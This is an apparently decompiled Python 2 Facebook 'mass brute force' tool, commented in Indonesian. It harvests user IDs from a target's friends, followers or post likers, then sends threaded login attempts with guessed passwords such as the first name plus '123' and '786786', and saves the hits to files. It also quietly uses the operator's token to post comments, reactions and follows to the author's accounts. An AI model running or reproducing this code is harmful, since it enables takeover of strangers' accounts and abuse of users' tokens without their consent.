# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
#recode ? izin dulu su
#fb.me/gaaaarzxd
#tinggal pake ngapain recode, nnti error
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
	import requests
except ImportError:
        os.system("pip2 install requests")
        exit(" [+] Silakan Ketik : python2 run.py")

reload(sys)
sys.setdefaultencoding('utf8')
#ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
ua = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'

### DURASI LICENSE BRO
durasi = str(datetime.now().strftime('%d-%m-%Y'))
license = requests.get("https://raw.githubusercontent.com/avsid/ambf/main/license.php").text
dev_angga = requests.get("https://raw.githubusercontent.com/avsid/ambf/main/durasi.php").text
response = " \033[0;97m[\033[0;93m!\033[0;97m] Mohon Tunggu Sebentar Lagi Update Script."
year_to_expire = int(dev_angga) ## angga kurniawan
try:
	assert int(durasi.split('-')[-1]) == year_to_expire, response
except AssertionError as e:
	os.system("clear")
	print logo
	print " [#] ------------------------------------------------"
	print " [#] Expired   : "+durasi
	print " [#] License   : "+license
	exit(response)
	
### LOGO
logo = """\033[0;97m __________             _____ _____________________
 \______   \           /     \\______   \_   _____/
  |    |  _/  ______  /  \ /  \|    |  _/|    __)  
  |    |   \ /_____/ /    Y    \    |   \|     \   
  |______  /         \____|__  /______  /\___  /   
         \/                  \/       \/     \/    
 [*] Check Results ? Type : python2 run.py result\n
 [#] Author    : Angga Kurniawan
 [#] GitHub    : https://github.com/anggaxd
 [#] ------------------------------------------------
 [#] Instagram : @gaaarzxd
 [#] Facebook  : https://fb.me/gaaaarzxd"""""
### kalau recode izin dulu su -_

id = []
cp = []
ok = []

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')
    una = '100015073506062'
    post = '1031861840659590'
    post2 = '1110619372783836'
    kom = 'GW PAKE SC LU BANG 😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl'
    kom2 = 'KEREN BANG 😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl'
    reac = 'LOVE'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    menu()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		token = raw_input("\n [+] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (' [•] Token Right') 
			raw_input (' [>] Press Enter To Go To The Menu')
			bot_komen()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] No Connection')
		sys.exit()
	print logo
	print "\n [ Welcome \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack From Public FriendList"
	print " [2] Crack From Total Followers"
	print " [3] Crack From Like Postingan"
	print " [0] Logout"
	pilih_menu()

def pilih_menu():
	ask = raw_input("\n [?] Choose >> ")
	if ask == "":
		print " [!] Choose The Correct One !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Fill In 'me' If You Want From Your Own Friends"
		idt = raw_input(" [+] ID Public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Name : "+sp["name"]
		except KeyError:
			print " [!] ID Nothing"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Fill In 'me' If You Want From Your Own Followers"
		idt = raw_input(" [+] ID Public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Name : "+sp["name"]
		except KeyError:
			print " [!] ID Nothing"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Enter The Post ID Only"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Successful Removed Token"
		exit()
	else:
		print " [!] Choose The Correct One !"
		exit()
	print " [*] Total ID : "+str(len(id))
	print " [+] File \033[0;92mOK\033[0;97m Stored In : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Stored In : out/cp.txt"
	print " [!] Wait A Little Longer Process Crack\n"
		
	def main(arg):
		global ok,cp,ua
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': ua})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a') 
				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
				save.close()
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
				cp.append(uid+' | '+pass1)
				save = open('out/cp.txt','a') 
				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				pass2 = name.lower()+'1234'
				rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.url
				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
					print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
					ok.append(uid+' | '+pass2)
					save = open('out/ok.txt','a') 
					save.write(' '+str(uid)+' | '+str(pass2)+'\n')
					save.close()
				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
					cp.append(uid+' | '+pass2)
					save = open('out/cp.txt','a') 
					save.write(' '+str(uid)+' | '+str(pass2)+'\n')
					save.close()
				else:
					pass3 = name.lower()+'12345'
					rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': ua})
					xo = rex.url
					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass3
						ok.append(uid+' | '+pass3)
						save = open('out/ok.txt','a') 
						save.write(' '+str(uid)+' | '+str(pass3)+'\n')
						save.close()
					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
						print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
						cp.append(uid+' | '+pass3)
						save = open('out/cp.txt','a') 
						save.write(' '+str(uid)+' | '+str(pass3)+'\n')
						save.close()
					else:
						pass4 = '786786'
						rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': ua})
						xo = rex.url
						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
							print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
							ok.append(uid+' | '+pass4)
							save = open('out/ok.txt','a') 
							save.write(' '+str(uid)+' | '+str(pass4)+'\n')
							save.close()
						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
							cp.append(uid+' | '+pass4)
							save = open('out/cp.txt','a') 
							save.write(' '+(uid)+' | '+str(pass4)+'\n')
							save.close()
						else:
							pass5 = '000786'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': ua})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(' '+(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(' '+str(uid)+' | '+str(pass5)+'\n')
								save.close()
							else:
								pass6 = '102030'
								rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'}, headers={'user-agent': ua})
								xo = rex.url
								if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
									print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass6
									ok.append(uid+' | '+pass6)
									save = open('out/ok.txt','a') 
									save.write(' '+(uid)+' | '+str(pass6)+'\n')
									save.close()
								elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass6
									cp.append(uid+' | '+pas6)
									save = open('out/cp.txt','a') 
									save.write(' '+(uid)+' | '+str(pass6)+'\n')
									save.close()
				
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()

### coded by angga kurniawan
### kalau bisa di pake ngapain di recode
### https://github.com/anggaxd
if __name__ == '__main__':
	if len(sys.argv) == 2:
		if sys.argv[1] == 'result':
			os.system("clear")
			print logo
			print "\n [+] Crack Results \033[0;93mCP\033[0;97m :\n"
			os.system('cat out/cp.txt')
			print "\n [+] Crack Results  \033[0;92mOK\033[0;97m :\n"
			os.system('cat out/ok.txt')
			exit("\n [#] Please Copy The Crack Results")
		else:
			print " [!] How To Use? "
			exit(" [*] Type : python2 run.py result")
	os.system("clear")
	print logo
	print "\n [#] Wait Update Tools..."
	os.system("git pull")
	time.sleep(1)
	tokenz()

# Awokawokawok Ngerekod:v